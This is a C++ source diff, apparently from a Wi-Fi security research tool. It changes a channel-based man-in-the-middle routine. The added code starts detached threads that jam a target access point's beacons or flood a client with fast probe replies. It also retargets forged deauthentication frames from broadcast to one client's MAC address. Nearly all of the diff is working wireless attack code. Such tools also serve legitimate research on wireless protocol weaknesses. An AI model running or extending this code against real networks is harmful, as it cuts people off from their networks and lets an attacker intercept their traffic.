@@ -31,6 +31,7 @@
 #include <unordered_map>
 #include <set>
 #include <iomanip>
+#include <thread>
 
 #include "ieee80211header.h"
 #include "util.h"
@@ -1389,6 +1390,24 @@ int get_last_seqnum(wi_dev *dev, uint8_t *addr)
 	return hdr->sequence.seqnum;
 }
 
+void reactivejam(wi_dev *dev, const MacAddr &bssid, int msecs)
+{
+	while (!global.exit)
+	{
+		if (osal_wi_jam_beacons(dev, bssid, msecs * 1000) < 0)
+			std::cerr << "Failed to jam beacon" << std::endl;
+	}
+}
+
+void fastreply(wi_dev *dev, const MacAddr &client)
+{
+	std::cout << "Fast probe reply: " << client;
+	while (!global.exit)
+	{
+		osal_wi_fastreply_start(dev, client, 10 * 1000);
+	}
+}
+
 int channelmitm(wi_dev *ap, wi_dev *clone)
 {
 	ieee802211fixedparams *fixedparams = (ieee802211fixedparams*)(global.beaconbuf + sizeof(ieee80211header));
@@ -1475,7 +1494,7 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 		ieee80211header *hdr = (ieee80211header*) buf;
 		hdr->fc.type = 0;
 		hdr->fc.subtype = 12;
-		memcpy(hdr->addr1, "\xff\xff\xff\xff\xff\xff", 6); // Why can we deauth every client? o.O
+		memcpy(hdr->addr1, clientmac, 6); // Why can we deauth every client? o.O
 		memcpy(hdr->addr2, opt.bssid, 6);
 		memcpy(hdr->addr3, opt.bssid, 6);
 		hdr->sequence.seqnum = 0;
@@ -1488,13 +1507,23 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 				std::cerr <<  "Error sending deauth apckets" << std::endl;
 			++hdr->sequence.seqnum; // Guessing
 		}
-		std::cout << "Jam beacons of " << opt.ssid << " for " << opt.seconds << "sec" << std::endl;
-		osal_wi_jam_beacons(global.jam, opt.bssid, opt.seconds * 1000);
+		
+		std::cout << "proberesolen = " << global.proberesplen << std::endl;
+		if (osal_wi_fastreply_packet(global.jam, global.proberesp, global.proberesplen) < 0) {
+			fprintf(stderr, "Failed to set reply packet\n");
+			return -1;
+		}
+
+		std::thread jam_thread(fastreply, global.jam, hdr->addr1);
+		jam_thread.detach();
+
+		/*std::cout << "THREAD: Jam beacons of " << opt.ssid << " for " << opt.seconds << "sec" << std::endl;
+		std::thread jam_thread(reactivejam, global.jam, opt.bssid, 0);
+		jam_thread.detach();*/
 #else		
 		std::cout << "[" << currentTime() << "]  " << "Started continuous jammer (cont jam)" << std::endl;
 		osal_wi_constantjam_start(global.jam);
 		global.isjamming = true;
-		
 #endif
 	}
 
